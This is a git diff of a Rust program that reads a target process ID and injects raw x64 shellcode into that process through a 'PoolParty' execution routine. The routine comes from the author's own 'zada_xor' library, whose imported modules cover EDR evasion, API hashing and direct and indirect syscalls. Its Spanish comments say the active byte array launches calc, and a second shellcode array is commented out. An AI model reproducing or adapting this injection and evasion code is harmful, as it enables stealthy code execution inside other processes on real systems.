@@ -1,31 +1,7 @@
 use std::io;
-use zada_xor::cipher::communication::SecureDataPacket;
-use zada_xor::cipher::handshake::*;
-use zada_xor::cipher::keys::Identity;
-use zada_xor::nt::kernel_objects::close::*;
-use zada_xor::nt::memory::protect_virtual_mem::*;
-use zada_xor::nt::memory::query_virtual_mem::*;
-use zada_xor::nt::memory::read_process_mem::nt_read_virtual_memory;
-use zada_xor::nt::memory::write_process_mem::nt_write_virtual_memory;
-use zada_xor::nt::process::open_process::*;
-use zada_xor::structures::pe::export::ExportTable;
-use zada_xor::structures::pe::headers::PeHeaderInfo;
-use zada_xor::structures::peb::ldr::PebLdrData;
-use zada_xor::structures::peb::ldr_entry::LdrDataTableEntry;
-#[cfg(target_arch = "x86_64")]
-use zada_xor::structures::peb::ldr_entry::offsets::x64_win10 as ldr_off;
-#[cfg(target_arch = "x86")]
-use zada_xor::structures::peb::ldr_entry::offsets::x86_win10 as ldr_off;
-use zada_xor::structures::peb::list_entry::ListEntry;
-use zada_xor::structures::peb::peb::Peb;
 use zada_xor::techniques::discovery::process::*;
 use zada_xor::techniques::evasion::api_hashing::*;
-use zada_xor::techniques::evasion::dinamic_api_resolution::*;
-use zada_xor::techniques::evasion::execution::dinamic_ssn::*;
-use zada_xor::techniques::evasion::execution::direct_syscall::*;
-use zada_xor::techniques::evasion::execution::dynamic_call::*;
-use zada_xor::techniques::evasion::execution::execute_poolparty_shellcode::*;
-use zada_xor::techniques::evasion::execution::indirect_syscall::*; // estos imports "zada-xor" vienen de mi propia lib que estoy desarrollando, el repo esta en github ;)
+use zada_xor::techniques::evasion::execution::execute_poolparty_shellcode::*;// estos imports "zada-xor" vienen de mi propia lib que estoy desarrollando, el repo esta en github ;)
 
 fn main() {
     let self_pid = std::process::id();
@@ -50,7 +26,7 @@ fn main() {
     let pid: u32 = pid.trim().parse::<u32>().unwrap();
     //let bytes_to_write = "RustInternals123".as_bytes();
     //esto es para abrir calc
-    /*
+    
     let bytes_to_write: &[u8] = &[
         0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
         0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
@@ -61,9 +37,9 @@ fn main() {
         0x6A, 0x01, 0x5A, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59,
         0x58, 0xC3,
     ];
-    */
-
     
+
+    /*
     let bytes_to_write: &[u8] = &[
         0x53, 0x56, 0x57, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x89, 0xE5, 0x48,
         0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x50, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
@@ -82,28 +58,7 @@ fn main() {
         0x8D, 0x45, 0x30, 0x45, 0x31, 0xC9, 0xFF, 0xD0, 0x48, 0x89, 0xEC, 0x41, 0x5F, 0x41, 0x5E, 0x41,
         0x5D, 0x41, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3,
     ];
-    
-    let handle = match open_process(
-        pid,
-        DESIRED_ACCESS::PROCESS_VM_READ
-            | DESIRED_ACCESS::PROCESS_VM_WRITE
-            | DESIRED_ACCESS::PROCESS_QUERY_INFORMATION
-            | DESIRED_ACCESS::PROCESS_VM_OPERATION
-            | DESIRED_ACCESS::PROCESS_DUP_HANDLE,
-    ) {
-        Ok(handl) => {
-            #[cfg(debug_assertions)]
-            println!(
-                "[+] Handle al proceso con pid: {} obtenido exitosamente",
-                pid
-            );
-            handl
-        }
-        Err(e) => {
-            println!("[!] Error open_process: {}", e);
-            return;
-        }
-    };
+    */
 
     match execute_poolparty_shellcode(pid, bytes_to_write) {
         Ok(_) => println!(
